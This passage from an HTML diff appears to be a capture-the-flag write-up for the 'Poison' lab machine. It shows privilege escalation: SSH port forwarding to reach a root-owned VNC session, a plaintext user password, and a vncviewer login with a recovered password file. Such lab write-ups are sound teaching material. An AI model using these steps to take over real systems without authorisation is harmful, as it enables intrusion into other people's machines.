+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xvnc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;529&nbsp;&nbsp;&nbsp;3&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>5801&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syslogd&nbsp;&nbsp;&nbsp;&nbsp;390&nbsp;&nbsp;&nbsp;7&nbsp;&nbsp;udp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>514&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*
+            </div>
+        </div><br>
+        <br>
+        Unfortunately, we can't connect to the root VNC session because this FreeBSD box doesn't have a VNC client.<br>
+        <br>
+        Howevre, because 5901 isn't a privileged port, we can use SSH to port forward Poison's 5901 local port out to our attacking machine. This way we can access the roor VNC sesion on Poison from our attacking host.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;charix@poison.htb&nbsp;-L&nbsp;5901:localhost:5901</span><br>
+                Password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">charix</span>@Poison:&nbsp;Charix!2#4%6&amp;8(0<br>
+                [...]<br>
+                charix@Poison:~&nbsp;%&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <code>netstat</code> now shows that my attacking machine is listening on port 5901.<br>
+            <div class="codebox">
+                ┌─[horace@parrot]─[~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#7f0044;font-weight:400">$netstat</span>&nbsp;-panut&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;5901<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>Not&nbsp;all&nbsp;processes&nbsp;could&nbsp;be&nbsp;identified,&nbsp;non-owned&nbsp;process&nbsp;<span style="color:#ff9d00;font-weight:700">info</span><br>
+                &nbsp;will&nbsp;not&nbsp;be&nbsp;shown,&nbsp;you&nbsp;would&nbsp;have&nbsp;to&nbsp;be&nbsp;root&nbsp;to&nbsp;see&nbsp;it&nbsp;all.<span style="color:#ff9d00;font-weight:700">)</span><br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>5901&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;<span style="color:#ff9d00;font-weight:700">::</span>1<span style="color:#ff9d00;font-weight:700">:</span>5901&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:::</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Connect to the root VNC session using <code>vncviewer</code>, with <code>-passwd</code> to specify the password file - <code>secret</code>.<br>
+            <div class="codebox">
+                ┌─[✗]─[horace@parrot]─[~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#vncviewer&nbsp;-passwd&nbsp;secret&nbsp;127.0.0.1:5901</span><br>
+                Connected&nbsp;to&nbsp;RFB&nbsp;server,&nbsp;using&nbsp;protocol&nbsp;version&nbsp;3.8<br>
+                Enabling&nbsp;TightVNC&nbsp;protocol&nbsp;extensions<br>
+                Performing&nbsp;standard&nbsp;VNC&nbsp;authentication<br>
+                Authentication&nbsp;successful<br>
+                [..]
+            </div>
+        </div><br>
+        <br>
+        An X window will pop up, and you'll be root.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+    </writeup>
+</section>
+
+</body>
+</html>
